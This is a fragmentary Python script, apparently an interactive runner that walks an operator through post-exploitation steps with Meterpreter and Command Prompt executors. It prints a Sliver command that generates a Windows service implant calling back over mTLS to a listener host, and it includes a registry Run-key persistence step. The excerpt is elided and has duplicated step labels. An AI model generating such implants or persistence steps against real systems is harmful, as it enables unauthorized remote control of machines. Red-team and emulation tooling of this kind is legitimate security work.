...
async def main():
    ...
    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 9 Parameter Input[/]")
    ...
    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 10 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: FilePath[/]")
    console.print(f"  Description: Target file path")
    default_val = ""
    required_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for FilePath (default: {default_val}, required: {required_val}): [/]"
    ...
    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 10 Parameter Input[/]")
    console.print(f"[bold yellow]  Parameter: Algorithm[/]")
    console.print(f"  Description: Hash algorithm (md5/sha1)")
    default_val = ""
    required_val = "True"
    user_input = console.input(
        f"[bold]➤ Enter value for Algorithm (default: {default_val}, required: {required_val}): [/]"
    ) or default_val
    if not user_input and True:
        raise ValueError("Missing required parameter: Algorithm")
    user_params["Algorithm"] = user_input

    # Meterpreter command execution
    console.print(f"[bold cyan]\n[Meterpreter Executor] Executing: checksum[/]")
    confirm_action()
    log_command_execution()
    try:
        metasploit_executor.checksum("'" + str(user_params["FilePath"]) + "'", str(user_params["Algorithm"]), str(user_params["Executor"]))
    except Exception as e:
        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
        raise
    ...
    console.print(f"""\
    sliver > generate --mtls {user_params["LHOST"]}:{user_params["LPORT"]} --os windows --arch 64bit --format service --save {user_params["SAVE_PATH"]}
    ...
    console.print(f"[bold cyan]\n📌[Command Prompt Executor] Step 14[/]")
    console.print(f"[bold cyan]\n📌[Name] Reg Key Run[/]")
    ...
    if "string3" in pddl_parameters:
        console.print(f"  [green]✓ Using stored value:[/] " + str(pddl_parameters["string3"]))
        user_params["command_to_execute"] = pddl_parameters["string3"]
    else:
    ...
    console.print(f"[bold cyan]\n📌[Meterpreter Executor] Step 18 Parameter Input[/]")
